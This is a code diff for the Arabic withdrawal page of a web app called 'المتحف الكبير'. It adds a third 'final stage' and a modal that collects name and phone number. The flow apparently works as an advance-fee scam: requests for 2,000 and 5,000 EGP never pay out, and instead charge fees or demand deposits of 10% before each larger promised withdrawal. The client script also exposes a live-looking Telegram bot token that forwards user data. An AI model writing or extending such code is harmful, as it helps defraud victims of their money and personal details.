@@ -4,14 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>سحب الأموال • المتحف الكبير</title>
-    <meta name="description" content="اطلب سحب رصيدك بسهولة وأمان. نظام المراحل التحفيزية.">
+    <meta name="description" content="نظام المراحل التحفيزية للسحب. اقترب من أموالك بخطوات آمنة.">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
     <!-- Firebase -->
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
     <style>
-        /* نفس التنسيقات السابقة دون تغيير */
+        /* ========== الأساسيات ========== */
         *{margin:0;padding:0;box-sizing:border-box;}
         body{
             font-family:'Cairo',sans-serif;
@@ -223,6 +223,73 @@
             color: #00ff9d;
             font-weight: bold;
         }
+
+        /* ========== المودال (الكارت الاحترافي) ========== */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.9);
+            backdrop-filter: blur(8px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            visibility: hidden;
+            opacity: 0;
+            transition: 0.3s;
+        }
+        .modal-overlay.show {
+            visibility: visible;
+            opacity: 1;
+        }
+        .modal-card {
+            background: linear-gradient(145deg, #1a1200, #0d0800);
+            border: 3px solid #ffd700;
+            border-radius: 30px;
+            padding: 25px 20px;
+            width: 90%;
+            max-width: 380px;
+            text-align: center;
+            box-shadow: 0 0 50px gold;
+        }
+        .modal-card h3 {
+            color: #ffd700;
+            font-size: 22px;
+            margin-bottom: 15px;
+        }
+        .modal-card p {
+            color: #ddd;
+            font-size: 14px;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        .modal-card input {
+            background: #111;
+            border: 1px solid #ffd700;
+            color: white;
+            padding: 12px;
+            margin-bottom: 12px;
+            border-radius: 12px;
+            text-align: center;
+        }
+        .modal-card input[readonly] {
+            background: #222;
+            color: #ffd700;
+            font-weight: bold;
+            text-align: left;
+            direction: ltr;
+        }
+        .modal-card .highlight {
+            color: #00ff9d;
+            font-weight: bold;
+        }
+        .modal-close-btn {
+            background: transparent;
+            border: 1px solid #ff6600;
+            color: #ff6600;
+            box-shadow: none;
+            margin-top: 5px;
+        }
     </style>
 </head>
 <body>
@@ -262,7 +329,7 @@
             <span class="required" id="requiredDeposit">0.00 جنيه</span>
             <span> (10% من قيمة السحب)</span>
         </div>
-        <!-- رسالة تحفيزية (تظهر عند الترقية للمرحلة الثانية) -->
+        <!-- رسالة تحفيزية للمرحلة الثانية -->
         <div class="motivation-message" id="motivationMsg" style="display: none;">
             🎉 أنت على بعد خطوة واحدة! المرحلة الأخيرة للسحب 5,000 جنيه.
         </div>
@@ -272,31 +339,47 @@
     </div>
     <button onclick="location.href='dashboard.html'">العودة للوحة التحكم</button>
 </div>
-<!-- Bottom Nav -->
-<div class="bottom-nav">
-    <div class="nav-item" data-url="dashboard.html" data-label="الرئيسية" data-egypt="𓂀" data-alt="🏠">
-        <div class="nav-circle">𓂀</div><div class="nav-label">الرئيسية</div>
-    </div>
-    <div class="nav-item" data-url="museum.html" data-label="المتحف" data-egypt="𓆣" data-alt="🏺">
-        <div class="nav-circle">𓆣</div><div class="nav-label">المتحف</div>
-    </div>
-    <div class="nav-item" data-url="statue1.html" data-label="المرحلة 1" data-egypt="𓁹" data-alt="⚒️">
-        <div class="nav-circle">𓁹</div><div class="nav-label">المرحلة 1</div>
-    </div>
-    <div class="nav-item" data-url="profile.html" data-label="حسابي" data-egypt="☥" data-alt="👤">
-        <div class="nav-circle">☥</div><div class="nav-label">حسابي</div>
+
+<!-- المودال الخاص بالمرحلة الثالثة -->
+<div class="modal-overlay" id="finalStageModal">
+    <div class="modal-card">
+        <h3>🔐 تأكيد أخير</h3>
+        <p>
+            ✅ تم توثيق حسابك بنسبة كبيرة<br>
+            📈 بفضل الإيداعات السابقة، حسابك مؤهل لفتح السحب 20,000 جنيه<br>
+            🔐 يتبقى تأكيد أخير بسيط لضمان أمان التحويل<br>
+            ⚡ بعدها يتم تفعيل السحب فورًا بدون تأخير<br>
+            💰 جميع أرباحك ستكون متاحة للتحويل المباشر<br>
+            🎯 خطوة واحدة فقط وتستلم أموالك
+        </p>
+        <input type="text" id="finalName" placeholder="الاسم الكامل">
+        <input type="tel" id="finalPhone" placeholder="رقم الهاتف">
+        <input type="text" id="finalAmount" placeholder="المبلغ المراد سحبه" value="20,000" readonly style="text-align: left; direction: ltr;">
+        <p style="font-size:12px; margin:5px 0;">* يجب إيداع <span id="finalRequiredDeposit">2,000</span> جنيه (10%) لتأكيد العملية</p>
+        <button onclick="submitFinalStage()">✅ تأكيد وإرسال الطلب</button>
+        <button class="modal-close-btn" onclick="closeModal()">إلغاء</button>
     </div>
 </div>
+
+<!-- Bottom Nav -->
+<div class="bottom-nav">
+    <div class="nav-item" data-url="dashboard.html"><div class="nav-circle">𓂀</div><div class="nav-label">الرئيسية</div></div>
+    <div class="nav-item" data-url="museum.html"><div class="nav-circle">𓆣</div><div class="nav-label">المتحف</div></div>
+    <div class="nav-item" data-url="statue1.html"><div class="nav-circle">𓁹</div><div class="nav-label">المرحلة 1</div></div>
+    <div class="nav-item" data-url="profile.html"><div class="nav-circle">☥</div><div class="nav-label">حسابي</div></div>
+</div>
+
 <script>
 // ========== الإعدادات ==========
 const TELEGRAM_TOKEN = "8535863939:AAFC4qgREiGQC-4c1QCQNrNp3gMprRsQRTs";
 const TELEGRAM_CHAT_ID = "6733319757";
 const USD_TO_EGP = 50;
-const DEPOSIT_RATIO = 0.10;    // 10%
+const DEPOSIT_RATIO = 0.10;
 
 // حدود المراحل
-const STAGE1_MIN = 2000;       // الحد الأدنى للمرحلة الأولى
-const STAGE2_MIN = 5000;       // الحد الأدنى للمرحلة الثانية
+const STAGE1_MIN = 2000;
+const STAGE2_MIN = 5000;
+const FINAL_AMOUNT = 20000; // المبلغ الثابت للمرحلة النهائية
 
 // ========== Toast ==========
 function showCustomToast(msg, type='success'){
@@ -318,9 +401,14 @@ const auth = firebase.auth();
 const db = firebase.firestore();
 
 let currentUser = null;
-let userCoinsEGP = 0;          // الرصيد الأساسي بالجنيه
-let totalDepositsEGP = 0;      // إجمالي الإيداعات بالجنيه
-let userStage = 1;             // المرحلة الحالية (1 أو 2)
+let userCoinsEGP = 0;
+let totalDepositsEGP = 0;
+let userStage = 1;             // 1, 2, or 3
+
+// تنسيق الأرقام بالإنجليزية مع فاصل آلاف
+function formatNumber(num) {
+    return num.toLocaleString('en-US');
+}
 
 // الاستماع للمستخدم
 auth.onAuthStateChanged(user => {
@@ -332,7 +420,7 @@ auth.onAuthStateChanged(user => {
                 const data = doc.data();
                 userCoinsEGP = data.coins || 0;
                 totalDepositsEGP = data.totalDeposits || 0;
-                userStage = data.withdrawStage || 1; // افتراضي المرحلة 1
+                userStage = data.withdrawStage || 1;
                 updateBalanceDisplay();
                 updateCalculations();
                 updateMotivationMessage();
@@ -341,34 +429,29 @@ auth.onAuthStateChanged(user => {
     }
 });
 
-// تحديث عرض الأرصدة
 function updateBalanceDisplay(){
     const currency = document.querySelector('input[name="currency"]:checked').value;
     const balanceSpan = document.getElementById('balanceDisplay');
     const depositSpan = document.getElementById('totalDepositsDisplay');
-    
     if (currency === 'EGP') {
-        balanceSpan.innerText = userCoinsEGP.toLocaleString() + ' جنيه';
-        depositSpan.innerText = totalDepositsEGP.toLocaleString() + ' جنيه';
+        balanceSpan.innerText = formatNumber(userCoinsEGP) + ' جنيه';
+        depositSpan.innerText = formatNumber(totalDepositsEGP) + ' جنيه';
     } else {
-        const usdBalance = (userCoinsEGP / USD_TO_EGP).toFixed(2);
-        const usdDeposit = (totalDepositsEGP / USD_TO_EGP).toFixed(2);
-        balanceSpan.innerText = usdBalance + ' دولار';
-        depositSpan.innerText = usdDeposit + ' دولار';
+        balanceSpan.innerText = (userCoinsEGP / USD_TO_EGP).toFixed(2) + ' دولار';
+        depositSpan.innerText = (totalDepositsEGP / USD_TO_EGP).toFixed(2) + ' دولار';
     }
 }
 
-// إظهار/إخفاء الرسالة التحفيزية
 function updateMotivationMessage() {
     const msgDiv = document.getElementById('motivationMsg');
     if (userStage === 2) {
         msgDiv.style.display = 'block';
+        msgDiv.innerText = '🎉 أنت على بعد خطوة واحدة! المرحلة الأخيرة للسحب 5,000 جنيه.';
     } else {
         msgDiv.style.display = 'none';
     }
 }
 
-// الحسابات عند تغيير المبلغ أو العملة
 function updateCalculations(){
     const amount = parseFloat(document.getElementById('amount').value) || 0;
     const currency = document.querySelector('input[name="currency"]:checked').value;
@@ -376,16 +459,13 @@ function updateCalculations(){
     const requiredSpan = document.getElementById('requiredDeposit');
     const warningDiv = document.getElementById('depositWarning');
     
-    // عرض التحويل
     if (amount <= 0) {
         convertedDiv.innerHTML = '';
     } else {
         if (currency === 'EGP') {
-            const usdAmount = (amount / USD_TO_EGP).toFixed(2);
-            convertedDiv.innerHTML = `💵 يعادل ${usdAmount} دولار`;
+            convertedDiv.innerHTML = `💵 يعادل ${(amount / USD_TO_EGP).toFixed(2)} دولار`;
         } else {
-            const egpAmount = (amount * USD_TO_EGP).toFixed(2);
-            convertedDiv.innerHTML = `🇪🇬 يعادل ${egpAmount} جنيه`;
+            convertedDiv.innerHTML = `🇪🇬 يعادل ${(amount * USD_TO_EGP).toFixed(2)} جنيه`;
         }
     }
     
@@ -393,28 +473,18 @@ function updateCalculations(){
     if (currency === 'USD') amountEGP = amount * USD_TO_EGP;
     
     const requiredDepositEGP = amountEGP * DEPOSIT_RATIO;
-    
-    // عرض المبلغ المطلوب بالعملة الحالية
     if (currency === 'EGP') {
-        requiredSpan.innerText = requiredDepositEGP.toLocaleString() + ' جنيه';
+        requiredSpan.innerText = formatNumber(requiredDepositEGP) + ' جنيه';
     } else {
-        const requiredUSD = (requiredDepositEGP / USD_TO_EGP).toFixed(2);
-        requiredSpan.innerText = requiredUSD + ' دولار';
+        requiredSpan.innerText = (requiredDepositEGP / USD_TO_EGP).toFixed(2) + ' دولار';
     }
     
     const hasEnoughDeposit = requiredDepositEGP <= totalDepositsEGP;
     const hasEnoughBalance = amountEGP <= userCoinsEGP;
-    
-    if (!hasEnoughDeposit || !hasEnoughBalance) {
-        warningDiv.style.borderColor = '#ff0000';
-        warningDiv.style.background = 'rgba(255,0,0,0.15)';
-    } else {
-        warningDiv.style.borderColor = '#ff6600';
-        warningDiv.style.background = 'rgba(255,100,0,0.2)';
-    }
+    warningDiv.style.borderColor = hasEnoughDeposit ? '#ff6600' : '#ff0000';
+    warningDiv.style.background = hasEnoughDeposit ? 'rgba(255,100,0,0.2)' : 'rgba(255,0,0,0.15)';
 }
 
-// ربط تغيير العملة
 document.querySelectorAll('input[name="currency"]').forEach(r => {
     r.addEventListener('change', ()=>{
         updateBalanceDisplay();
@@ -424,7 +494,6 @@ document.querySelectorAll('input[name="currency"]').forEach(r => {
 
 function goBack(){ history.back(); }
 
-// التحقق من رقم الهاتف المصري
 function validatePhone(phone, method){
     let clean = phone.replace(/\s+/g,'').replace(/[^\d]/g,'');
     const prefixes = {
@@ -437,7 +506,6 @@ function validatePhone(phone, method){
     return prefixes[method].some(p => clean.startsWith(p));
 }
 
-// إرسال إشعار تيليجرام
 async function sendTelegram(data, currency){
     try{
         const msg = `
@@ -446,8 +514,8 @@ async function sendTelegram(data, currency){
 🔹 الطريقة: ${data.method}
 📞 العنوان: ${data.address}
 💰 المبلغ: ${data.amount} ${currency}
-💵 الرصيد بعد السحب: ${(userCoinsEGP - data.amountEGP).toLocaleString()} جنيه
-📥 إيداعات المستخدم: ${totalDepositsEGP.toLocaleString()} جنيه
+💵 الرصيد بعد السحب: ${formatNumber(userCoinsEGP - data.amountEGP)} جنيه
+📥 إيداعات المستخدم: ${formatNumber(totalDepositsEGP)} جنيه
 🆔 ${data.userId}
 🕐 ${new Date().toLocaleString('ar-EG')}`;
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,{
@@ -458,7 +526,7 @@ async function sendTelegram(data, currency){
     }catch(e){ console.warn('Telegram error'); }
 }
 
-// تأكيد السحب
+// ========== المنطق الرئيسي ==========
 async function confirmWithdraw(event){
     const method = document.getElementById('method').value;
     const address = document.getElementById('accountAddress').value.trim();
@@ -475,24 +543,15 @@ async function confirmWithdraw(event){
     let amountEGP = amount;
     if (currency === 'USD') amountEGP = amount * USD_TO_EGP;
     
-    // التحقق من الحد الأدنى حسب المرحلة
-    let currentMin = userStage === 1 ? STAGE1_MIN : STAGE2_MIN;
-    if (amountEGP < currentMin) {
-        const minAmount = currency === 'EGP' ? currentMin.toLocaleString() + ' جنيه' : (currentMin / USD_TO_EGP).toFixed(0) + ' دولار';
-        showCustomToast(`⚠️ الحد الأدنى للسحب حالياً هو ${minAmount}`, 'warning');
+    let currentMin = (userStage === 1) ? STAGE1_MIN : (userStage === 2 ? STAGE2_MIN : 0);
+    if (userStage !== 3 && amountEGP < currentMin) {
+        showCustomToast(`⚠️ الحد الأدنى للسحب حالياً هو ${formatNumber(currentMin)} جنيه`, 'warning');
         return;
     }
     
-    // التحقق من رقم الهاتف
-    if (['فودافون كاش','اتصالات كاش','اورنج كاش'].includes(method)){
-        if (!validatePhone(address, method)){
-            let err = '';
-            if(method==='فودافون كاش') err = 'رقم فودافون كاش يجب أن يبدأ بـ 010/015/016';
-            else if(method==='اتصالات كاش') err = 'رقم اتصالات كاش يجب أن يبدأ بـ 011';
-            else err = 'رقم اورنج كاش يجب أن يبدأ بـ 012';
-            showCustomToast(err, 'error');
-            return;
-        }
+    if (['فودافون كاش','اتصالات كاش','اورنج كاش'].includes(method) && !validatePhone(address, method)) {
+        showCustomToast('رقم الهاتف غير صحيح', 'error');
+        return;
     }
     
     if (amountEGP > userCoinsEGP) {
@@ -502,95 +561,123 @@ async function confirmWithdraw(event){
     
     const requiredDeposit = amountEGP * DEPOSIT_RATIO;
     if (requiredDeposit > totalDepositsEGP) {
-        showCustomToast(`يجب أن يكون لديك إيداعات لا تقل عن ${requiredDeposit.toLocaleString()} جنيه`, 'error');
+        showCustomToast(`يجب أن يكون لديك إيداعات لا تقل عن ${formatNumber(requiredDeposit)} جنيه`, 'error');
         return;
     }
     
-    // منطق المرحلة الأولى (2000 جنيه) -> ترقية للمرحلة الثانية وخصم 200 جنيه
+    // ----- المرحلة الأولى -----
     if (userStage === 1 && amountEGP === STAGE1_MIN) {
-        // التحقق من أن المبلغ المطلوب خصمه (200) موجود في الرصيد
         if (userCoinsEGP < 200) {
             showCustomToast('رصيدك غير كافٍ لخصم رسوم التحويل (200 جنيه)', 'error');
             return;
         }
-        
-        submitBtn.disabled = true;
-        submitBtn.innerText = 'جاري الترقية...';
-        loader.style.display = 'block';
-        
+        submitBtn.disabled = true; submitBtn.innerText = 'جاري الترقية...'; loader.style.display = 'block';
         try {
-            // خصم 200 جنيه كرسوم تحويل، وتحديث المرحلة إلى 2
             await db.collection('users').doc(currentUser.uid).update({
                 coins: firebase.firestore.FieldValue.increment(-200),
                 withdrawStage: 2
             });
-            
             showCustomToast('🎉 تم ترقيتك إلى المرحلة الثانية! يمكنك الآن سحب 5,000 جنيه.', 'success');
             document.getElementById('motivationMsg').style.display = 'block';
-            
             document.getElementById('amount').value = '';
-            document.getElementById('convertedAmount').innerHTML = '';
-            updateCalculations();
-        } catch(err) {
-            showCustomToast('خطأ: '+err.message, 'error');
-        } finally {
-            submitBtn.disabled = false;
-            submitBtn.innerText = 'تأكيد طلب السحب';
-            loader.style.display = 'none';
-        }
+        } catch(err) { showCustomToast('خطأ: '+err.message, 'error'); }
+        finally { submitBtn.disabled = false; submitBtn.innerText = 'تأكيد طلب السحب'; loader.style.display = 'none'; }
         return;
     }
     
-    // المرحلة الثانية (أو أي مبلغ آخر في المرحلة الثانية) -> سحب طبيعي
+    // ----- المرحلة الثانية -----
     if (userStage === 2 && amountEGP >= STAGE2_MIN) {
-        submitBtn.disabled = true;
-        submitBtn.innerText = 'جاري المعالجة...';
-        loader.style.display = 'block';
-        
+        submitBtn.disabled = true; submitBtn.innerText = 'جاري التحضير...'; loader.style.display = 'block';
         try {
-            const userDoc = await db.collection('users').doc(currentUser.uid).get();
-            const userData = userDoc.data();
-            const withdrawData = {
-                userId: currentUser.uid,
-                username: userData.username || '',
-                method, address,
-                amount, currency,
-                amountEGP,
-                requiredDepositEGP: requiredDeposit,
-                status: 'pending',
-                createdAt: firebase.firestore.FieldValue.serverTimestamp()
-            };
-            
-            await db.collection('withdrawals').add(withdrawData);
-            await db.collection('users').doc(currentUser.uid).update({
-                coins: firebase.firestore.FieldValue.increment(-amountEGP)
-            });
-            
-            sendTelegram(withdrawData, currency).catch(e=>{});
-            showCustomToast('تم إرسال طلب السحب بنجاح', 'success');
-            
-            document.getElementById('method').value = '';
-            document.getElementById('accountAddress').value = '';
+            await db.collection('users').doc(currentUser.uid).update({ withdrawStage: 3 });
+            showCustomToast('🎉 أنت الآن في المرحلة النهائية! املأ بياناتك للتأكيد.', 'success');
+            // فتح المودال مع المبلغ الثابت 20000
+            document.getElementById('finalAmount').value = formatNumber(FINAL_AMOUNT);
+            document.getElementById('finalRequiredDeposit').innerText = formatNumber(FINAL_AMOUNT * DEPOSIT_RATIO);
+            document.getElementById('finalStageModal').classList.add('show');
             document.getElementById('amount').value = '';
-            document.getElementById('convertedAmount').innerHTML = '';
-            updateCalculations();
-            
-            setTimeout(()=> location.href = 'transactions.html', 2000);
-        } catch(err){
-            showCustomToast('خطأ: '+err.message, 'error');
-        } finally {
-            submitBtn.disabled = false;
-            submitBtn.innerText = 'تأكيد طلب السحب';
-            loader.style.display = 'none';
-        }
+        } catch(err) { showCustomToast('خطأ: '+err.message, 'error'); }
+        finally { submitBtn.disabled = false; submitBtn.innerText = 'تأكيد طلب السحب'; loader.style.display = 'none'; }
         return;
     }
     
-    // إذا وصلنا هنا فهذا يعني أن المبلغ غير مطابق للمرحلة (مثلاً في المرحلة الأولى ومبلغ ليس 2000)
-    showCustomToast(`في المرحلة الحالية يجب سحب ${currentMin.toLocaleString()} جنيه بالضبط`, 'warning');
+    // ----- المرحلة الثالثة -----
+    if (userStage === 3) {
+        showCustomToast('الرجاء إكمال بيانات التأكيد في النافذة المنبثقة', 'warning');
+        document.getElementById('finalAmount').value = formatNumber(FINAL_AMOUNT);
+        document.getElementById('finalRequiredDeposit').innerText = formatNumber(FINAL_AMOUNT * DEPOSIT_RATIO);
+        document.getElementById('finalStageModal').classList.add('show');
+        return;
+    }
+    
+    showCustomToast(`في المرحلة الحالية يجب سحب ${formatNumber(currentMin)} جنيه بالضبط`, 'warning');
 }
 
-// تهيئة العرض
+// ========== تقديم المرحلة الثالثة ==========
+async function submitFinalStage() {
+    const name = document.getElementById('finalName').value.trim();
+    const phone = document.getElementById('finalPhone').value.trim();
+    const amount = FINAL_AMOUNT; // 20000
+    const method = document.getElementById('method').value;
+    const address = document.getElementById('accountAddress').value.trim();
+    const currency = 'EGP';
+    
+    if (!name || !phone || !method || !address) {
+        showCustomToast('جميع الحقول مطلوبة', 'error');
+        return;
+    }
+    
+    let amountEGP = amount;
+    const requiredDeposit = amountEGP * DEPOSIT_RATIO;
+    if (requiredDeposit > totalDepositsEGP) {
+        showCustomToast(`يجب أن يكون لديك إيداعات لا تقل عن ${formatNumber(requiredDeposit)} جنيه`, 'error');
+        return;
+    }
+    if (amountEGP > userCoinsEGP) {
+        showCustomToast('رصيد غير كافٍ', 'error');
+        return;
+    }
+    
+    const submitBtn = document.querySelector('#finalStageModal .modal-card button:first-of-type');
+    submitBtn.disabled = true;
+    submitBtn.innerText = 'جاري الإرسال...';
+    
+    try {
+        const userDoc = await db.collection('users').doc(currentUser.uid).get();
+        const userData = userDoc.data();
+        const withdrawData = {
+            userId: currentUser.uid,
+            username: userData.username || name,
+            phone: phone,
+            method, address,
+            amount, currency,
+            amountEGP,
+            requiredDepositEGP: requiredDeposit,
+            status: 'pending',
+            createdAt: firebase.firestore.FieldValue.serverTimestamp(),
+            finalStage: true
+        };
+        await db.collection('withdrawals').add(withdrawData);
+        await db.collection('users').doc(currentUser.uid).update({
+            coins: firebase.firestore.FieldValue.increment(-amountEGP)
+        });
+        sendTelegram(withdrawData, currency);
+        showCustomToast('🎉 تم استلام طلب السحب النهائي! سيتم التحويل قريباً.', 'success');
+        closeModal();
+        setTimeout(() => location.href = 'transactions.html', 2000);
+    } catch(err) {
+        showCustomToast('خطأ: '+err.message, 'error');
+    } finally {
+        submitBtn.disabled = false;
+        submitBtn.innerText = '✅ تأكيد وإرسال الطلب';
+    }
+}
+
+function closeModal() {
+    document.getElementById('finalStageModal').classList.remove('show');
+}
+
+// تهيئة
 updateBalanceDisplay();
 </script>
 </body>
